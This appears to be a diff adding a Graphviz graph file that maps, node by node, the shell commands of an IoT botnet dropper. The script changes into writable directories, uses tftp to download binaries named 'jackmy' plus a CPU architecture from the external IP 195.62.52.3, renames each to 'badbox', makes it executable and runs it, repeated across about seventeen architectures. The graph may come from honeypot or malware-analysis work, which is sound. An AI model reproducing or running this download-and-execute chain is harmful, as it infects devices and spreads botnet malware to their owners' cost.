@@ -1,0 +1,364 @@
+digraph {
+0 [label="ulimit -n 1024 "];
+0 -> 0
+2 [label="cp /bin/busybox /tmp/ "];
+2 -> 2
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/system "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 14 [label="||,"];
+14 [label="tftp -r jackmymips -g 195.62.52.3 "];
+14 -> 16 [label=";,"];
+16 [label="cat jackmymips badbox "];
+16 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 361 [label=";,"];
+361 [label="./badbox "];
+361 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/system "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 34 [label="||,"];
+34 [label="tftp -r jackmymips64 -g 195.62.52.3 "];
+34 -> 36 [label=";,"];
+36 [label="cat jackmymips64 badbox "];
+36 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 361 [label=";,"];
+361 [label="./badbox "];
+361 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/system "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 54 [label="||,"];
+54 [label="tftp -r jackmymipsel -g 195.62.52.3 "];
+54 -> 56 [label=";,"];
+56 [label="cat jackmymipsel badbox "];
+56 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 361 [label=";,"];
+361 [label="./badbox "];
+361 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/system "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 74 [label="||,"];
+74 [label="tftp -r jackmysh2eb -g 195.62.52.3 "];
+74 -> 76 [label=";,"];
+76 [label="cat jackmysh2eb badbox "];
+76 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 361 [label=";,"];
+361 [label="./badbox "];
+361 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/system "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 94 [label="||,"];
+94 [label="tftp -r jackmysh2elf -g 195.62.52.3 "];
+94 -> 96 [label=";,"];
+96 [label="cat jackmysh2elf badbox "];
+96 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 361 [label=";,"];
+361 [label="./badbox "];
+361 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/system "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 114 [label="||,"];
+114 [label="tftp -r jackmysh4 -g 195.62.52.3 "];
+114 -> 116 [label=";,"];
+116 [label="cat jackmysh4 badbox "];
+116 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 361 [label=";,"];
+361 [label="./badbox "];
+361 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/system "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 134 [label="||,"];
+134 [label="tftp -r jackmyx86 -g 195.62.52.3 "];
+134 -> 136 [label=";,"];
+136 [label="cat jackmyx86 badbox "];
+136 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 361 [label=";,"];
+361 [label="./badbox "];
+361 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/system "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 154 [label="||,"];
+154 [label="tftp -r jackmyi486 -g 195.62.52.3 "];
+154 -> 156 [label=";,"];
+156 [label="cat jackmyi486 badbox "];
+156 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 361 [label=";,"];
+361 [label="./badbox "];
+361 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/system "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 174 [label="||,"];
+174 [label="tftp -r jackmyi586 -g 195.62.52.3 "];
+174 -> 176 [label=";,"];
+176 [label="cat jackmyi586 badbox "];
+176 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 361 [label=";,"];
+361 [label="./badbox "];
+361 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/system "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 194 [label="||,"];
+194 [label="tftp -r jackmyi686 -g 195.62.52.3 "];
+194 -> 196 [label=";,"];
+196 [label="cat jackmyi686 badbox "];
+196 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 361 [label=";,"];
+361 [label="./badbox "];
+361 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/system "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 214 [label="||,"];
+214 [label="tftp -r jackmypowerpc -g 195.62.52.3 "];
+214 -> 216 [label=";,"];
+216 [label="cat jackmypowerpc badbox "];
+216 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 361 [label=";,"];
+361 [label="./badbox "];
+361 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/system "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 234 [label="||,"];
+234 [label="tftp -r jackmypowerpc440fp -g 195.62.52.3 "];
+234 -> 236 [label=";,"];
+236 [label="cat jackmypowerpc440fp badbox "];
+236 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 361 [label=";,"];
+361 [label="./badbox "];
+361 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/system "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 254 [label="||,"];
+254 [label="tftp -r jackmym86k -g 195.62.52.3 "];
+254 -> 256 [label=";,"];
+256 [label="cat jackmym86k badbox "];
+256 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 361 [label=";,"];
+361 [label="./badbox "];
+361 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/system "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 274 [label="||,"];
+274 [label="tftp -r jackmysparc -g 195.62.52.3 "];
+274 -> 276 [label=";,"];
+276 [label="cat jackmysparc badbox "];
+276 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 361 [label=";,"];
+361 [label="./badbox "];
+361 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/system "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 294 [label="||,"];
+294 [label="tftp -r jackmyarmv4 -g 195.62.52.3 "];
+294 -> 296 [label=";,"];
+296 [label="cat jackmyarmv4 badbox "];
+296 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 361 [label=";,"];
+361 [label="./badbox "];
+361 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/system "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 314 [label="||,"];
+314 [label="tftp -r jackmyarmv4tl -g 195.62.52.3 "];
+314 -> 316 [label=";,"];
+316 [label="cat jackmyarmv4tl badbox "];
+316 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 361 [label=";,"];
+361 [label="./badbox "];
+361 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/system "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 334 [label="||,"];
+334 [label="tftp -r jackmyarmv5 -g 195.62.52.3 "];
+334 -> 336 [label=";,"];
+336 [label="cat jackmyarmv5 badbox "];
+336 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 361 [label=";,"];
+361 [label="./badbox "];
+361 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/system "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 354 [label="||,"];
+354 [label="tftp -r jackmyarmv6 -g 195.62.52.3 "];
+354 -> 356 [label=";,"];
+356 [label="cat jackmyarmv6 badbox "];
+356 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 361 [label=";,"];
+}
